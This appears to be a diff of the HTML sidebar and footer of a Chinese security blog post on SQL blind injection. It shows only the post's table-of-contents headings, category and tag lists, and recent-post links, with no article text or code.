-</div><script type="text/javascript" src="/js/share.js?v=1.0.4" async></script><a data-url="https://www.k0rz3n.com/2019/02/21/一篇文章带你深入理解 SQL 盲注/" data-id="cjv7v4tf600bbvgv8dslzui59" class="article-share-link">Aktie</a><div class="tags"><a href="/tags/SQL-注入/">SQL 注入</a></div><div class="post-nav"><a href="/2019/02/22/图形化显示 Python 函数之间的调用关系/" class="pre">图形化显示 Python 函数之间的调用关系</a><a href="/2019/02/12/PHPINFO 中的重要信息/" class="next">PHPINFO 中的重要信息</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="side_toc"><div style="position:fixed" class="toc-article"><div class="toc-title">Inhalte</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-盲注的一般模式"><span class="toc-number">2.</span> <span class="toc-text">0X01 盲注的一般模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-and-0-的短路特性"><span class="toc-number">2.1.</span> <span class="toc-text">1.and 0 的短路特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-or-1-的短路特性"><span class="toc-number">2.2.</span> <span class="toc-text">2.or 1 的短路特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-elt-的分流特性"><span class="toc-number">2.3.</span> <span class="toc-text">3.elt() 的分流特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-field-的分流特性"><span class="toc-number">2.4.</span> <span class="toc-text">4.field() 的分流特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-基于时间的盲注"><span class="toc-number">3.</span> <span class="toc-text">0X02 基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-MYSQL-的-sleep-和-benchmark"><span class="toc-number">3.1.</span> <span class="toc-text">1. MYSQL 的 sleep 和 benchmark</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#补充-SQL-Server的方法："><span class="toc-number">3.1.1.</span> <span class="toc-text">补充 SQL Server的方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Heavy-Query-笛卡尔积"><span class="toc-number">3.2.</span> <span class="toc-text">2.Heavy Query 笛卡尔积</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Get-lock-加锁机制"><span class="toc-number">3.3.</span> <span class="toc-text">3.Get_lock() 加锁机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析到这里似乎已经结束了，但是其实这个-get-lock-的使用并不是没有限制条件"><span class="toc-number">3.3.1.</span> <span class="toc-text">分析到这里似乎已经结束了，但是其实这个 get_lock 的使用并不是没有限制条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Heavy-Query-正则表达式"><span class="toc-number">3.4.</span> <span class="toc-text">4.Heavy Query 正则表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-该种技术的优缺点"><span class="toc-number">3.5.</span> <span class="toc-text">5.该种技术的优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-一点点补充"><span class="toc-number">3.6.</span> <span class="toc-text">6.一点点补充</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-基于布尔的盲注"><span class="toc-number">4.</span> <span class="toc-text">0X03 基于布尔的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-使用条件"><span class="toc-number">4.1.</span> <span class="toc-text">1.使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-简单举例"><span class="toc-number">4.2.</span> <span class="toc-text">2.简单举例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-高级案例"><span class="toc-number">4.3.</span> <span class="toc-text">3.高级案例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#举几个例子："><span class="toc-number">4.3.1.</span> <span class="toc-text">举几个例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-使用-amp"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">1.使用 &amp;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-使用"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">2.使用 |</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-使用"><span class="toc-number">4.3.1.3.</span> <span class="toc-text">3.使用 ^</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-使用"><span class="toc-number">4.3.1.4.</span> <span class="toc-text">4.使用 ~</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#示例1："><span class="toc-number">4.3.1.4.1.</span> <span class="toc-text">示例1：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#示例2："><span class="toc-number">4.3.1.4.2.</span> <span class="toc-text">示例2：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-使用-lt-lt-或-gt-gt"><span class="toc-number">4.3.1.5.</span> <span class="toc-text">5.使用 &lt;&lt; 或 &gt;&gt;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-一点点补充-1"><span class="toc-number">4.3.1.6.</span> <span class="toc-text">6.一点点补充</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-数据提取方法"><span class="toc-number">5.</span> <span class="toc-text">0X04 数据提取方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-举几个简单的例子："><span class="toc-number">5.1.</span> <span class="toc-text">1.举几个简单的例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#示例1"><span class="toc-number">5.1.1.</span> <span class="toc-text">示例1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例2"><span class="toc-number">5.1.2.</span> <span class="toc-text">示例2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例3"><span class="toc-number">5.1.3.</span> <span class="toc-text">示例3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-二分法提取数据"><span class="toc-number">5.2.</span> <span class="toc-text">2.二分法提取数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-高级技巧"><span class="toc-number">6.</span> <span class="toc-text">0X05 高级技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-简单介绍："><span class="toc-number">6.1.</span> <span class="toc-text">1.简单介绍：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-针对-MsSQL"><span class="toc-number">6.2.</span> <span class="toc-text">2.针对 MsSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-master-xp-dirtree"><span class="toc-number">6.2.1.</span> <span class="toc-text">1.master..xp_dirtree</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-master-xp-fileexist"><span class="toc-number">6.2.2.</span> <span class="toc-text">2.master..xp_fileexist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-master-xp-subdirs"><span class="toc-number">6.2.3.</span> <span class="toc-text">3.master..xp_subdirs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-实战案例"><span class="toc-number">6.2.4.</span> <span class="toc-text">4.实战案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-针对-Oracle"><span class="toc-number">6.3.</span> <span class="toc-text">3.针对 Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-UTL-INADDR-GET-HOST-ADDRESS"><span class="toc-number">6.3.1.</span> <span class="toc-text">1.UTL_INADDR.GET_HOST_ADDRESS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-UTL-HTTP-REQUEST"><span class="toc-number">6.3.2.</span> <span class="toc-text">2.UTL_HTTP.REQUEST</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-HTTPURITYPE-GETCLOB"><span class="toc-number">6.3.3.</span> <span class="toc-text">3.HTTPURITYPE.GETCLOB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-DBMS-LDAP-INIT"><span class="toc-number">6.3.4.</span> <span class="toc-text">4.DBMS_LDAP.INIT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-实战案例"><span class="toc-number">6.3.5.</span> <span class="toc-text">5.实战案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-针对-MySQL"><span class="toc-number">6.4.</span> <span class="toc-text">4.针对 MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-利用条件"><span class="toc-number">6.4.1.</span> <span class="toc-text">1.利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-LOAD-FILE"><span class="toc-number">6.4.2.</span> <span class="toc-text">1.LOAD_FILE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-实战案例"><span class="toc-number">6.4.3.</span> <span class="toc-text">2.实战案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-sqlmap-的扩展"><span class="toc-number">6.5.</span> <span class="toc-text">5.sqlmap 的扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-总结"><span class="toc-number">7.</span> <span class="toc-text">0X06 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X07-参考链接"><span class="toc-number">8.</span> <span class="toc-text">0X07 参考链接</span></a></li></ol></div></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/byoungd/pure"> Pure Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/byoungd"> byoungd.</a></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=1.0.4" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.4" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.4"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.4"></script><script type="text/javascript" src="/js/prism.js?v=1.0.4"></script></div></body></html>
+</div><div class="tags"><a href="/tags/SQL-注入/">SQL 注入</a></div><div class="post-nav"><a class="pre" href="/2019/02/22/图形化显示 Python 函数之间的调用关系/">图形化显示 Python 函数之间的调用关系</a><a class="next" href="/2019/02/12/PHPINFO 中的重要信息/">PHPINFO 中的重要信息</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Kategorien</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Blogroll</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
